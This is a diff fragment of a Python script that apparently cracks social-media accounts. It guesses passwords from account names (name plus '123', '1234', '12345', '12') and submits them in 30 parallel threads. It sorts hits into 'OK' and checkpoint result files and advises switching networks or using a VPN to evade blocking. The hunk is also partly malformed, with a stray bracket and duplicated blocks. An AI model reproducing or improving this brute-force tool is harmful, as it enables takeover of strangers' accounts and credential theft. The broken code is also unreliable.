@@ -960,26 +960,6 @@ class __crack__:
                         bb = yntks.split('<=>')
                         xz = bb[1].split(' ')
                         if len(xz) == 1:
-
-                        	]
-                        __yayanXD__.submit(self.__api__, bb[0], raimuuu)
-                    except:
-                        pass
-
-            print '\n\n %s[%s#%s] crack selesai...'%(N,K,N)
-            os.remove(self.apk)
-            hasil(ok,cp)
-            exit()
-        elif yan in ('2', '02'):
-            print '\n [%s+%s] open ok accounts -> results/OK-%s-%s-%s.txt'%(O,N,ha, op, ta)
-            print ' [%s+%s] open cp accounts -> results/CP-%s-%s-%s.txt'%(O,N,ha, op, ta)
-            print '\n [%s!%s] only crack with cellular data or use premium vpn\n'%(M,N)
-            with YayanGanteng(max_workers=30) as (__yayanXD__):
-                for yntks in self.id: # Yo Ndak Tau Kok Tanya Saia
-                    try:
-                        bb = yntks.split('<=>')
-                        xz = bb[1].split(' ')
-                        if len(xz) == 1:
                             raimuuu = [
                                 xz[0], xz[0]+'123', xz[0]+'1234',
                                 xz[0]+'12345', xz[0]+'12',
